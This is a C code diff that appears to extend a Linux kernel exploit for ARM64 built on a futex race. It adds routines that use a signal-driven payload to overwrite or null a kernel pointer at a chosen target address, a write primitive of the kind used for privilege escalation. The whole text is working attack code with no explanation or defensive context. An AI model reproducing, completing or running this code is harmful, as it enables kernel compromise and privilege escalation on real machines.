@@ -110,6 +110,7 @@ V14_OFFSET_ASSERT(secondary_1, 0x774);
 
 static struct v14_state_page g_v14_state __attribute__((aligned(4096)));
 static uint64_t g_v14_delay_cycles;
+static atomic_int g_v14_followup_epoch;
 
 static uint64_t read_cntvct(void) {
   uint64_t val;
@@ -2400,7 +2401,7 @@ static void *consumer_thread_fn_v14(void *arg) {
       continue;
     }
 
-    if (g_sched_mutation_state != NULL) {
+    if (state == 1 && g_sched_mutation_state != NULL) {
       __atomic_store_n(g_sched_mutation_state, g_sched_pending_state,
                        __ATOMIC_RELEASE);
     }
@@ -2421,7 +2422,7 @@ static void *consumer_thread_fn_v14(void *arg) {
     errno = 0;
     int nice_value = 19 - ((state - 1) % 8);
     long ret = sched_setattr_tid_v4(tid, nice_value);
-    if (g_sched_mutation_state != NULL) {
+    if (state == 1 && g_sched_mutation_state != NULL) {
       __atomic_store_n(g_sched_mutation_state, g_sched_mutated_state,
                        __ATOMIC_RELEASE);
     }
@@ -2433,6 +2434,57 @@ static void *consumer_thread_fn_v14(void *arg) {
     atomic_store(&g_v14_state.state, 0);
   }
   return NULL;
+}
+
+static int futex_v14_followup_write(uint64_t page_base,
+                                    uint64_t target_addr,
+                                    uint64_t replacement_addr,
+                                    int write_null) {
+  int waiter_tid = atomic_load(&g_v14_state.waiter_tid);
+  if (!atomic_load(&g_use_sigusr1) || atomic_load(&g_v14_state.stop) ||
+      atomic_load(&g_v14_state.state) != 0 || waiter_tid == 0 ||
+      waiter_tid != (int)syscall(SYS_gettid)) {
+    return 0;
+  }
+
+  if (write_null) {
+    sigusr1_build_null_write_payload(page_base, target_addr);
+  } else {
+    sigusr1_build_pointer_write_payload(page_base, target_addr,
+                                        replacement_addr);
+  }
+  if (!sigusr1_fire_and_wait()) {
+    return 0;
+  }
+
+  atomic_store(&g_v14_state.sched_done, 0);
+  atomic_store(&g_v14_state.success_count, 0);
+  atomic_store(&g_v14_state.attempt_count, 0);
+  int epoch = atomic_fetch_add(&g_v14_followup_epoch, 1);
+  atomic_store(&g_v14_state.state, epoch);
+
+  for (uint64_t spins = 0;
+       spins <= 0x3b9ac9ffULL &&
+           !atomic_load(&g_v14_state.sched_done) &&
+           !atomic_load(&g_v14_state.stop);
+       spins++) {
+    __asm__ volatile("yield" ::: "memory");
+  }
+
+  int ok = atomic_load(&g_v14_state.sched_done) &&
+           atomic_load(&g_v14_state.success_count) >= 1;
+  atomic_store(&g_v14_state.state, 0);
+  return ok;
+}
+
+int futex_v14_rewrite_pointer(uint64_t page_base, uint64_t target_addr,
+                              uint64_t replacement_addr) {
+  return futex_v14_followup_write(page_base, target_addr, replacement_addr,
+                                  0);
+}
+
+int futex_v14_quarantine_pointer(uint64_t page_base, uint64_t target_addr) {
+  return futex_v14_followup_write(page_base, target_addr, 0, 1);
 }
 
 static void *waiter_thread_fn_v14(void *arg) {
@@ -2585,6 +2637,7 @@ int run_futex_trigger_v14_cb(futex_post_trigger_cb post_trigger_cb,
   atomic_store(&g_v14_state.state, 0);
   atomic_store(&g_v14_state.secondary_0, 0);
   atomic_store(&g_v14_state.secondary_1, 0);
+  atomic_store(&g_v14_followup_epoch, 2);
   atomic_store(&deadlock_seen, 0);
   atomic_store(&waiter_ok, 0);
   atomic_store(&g_cb_invoked, 0);
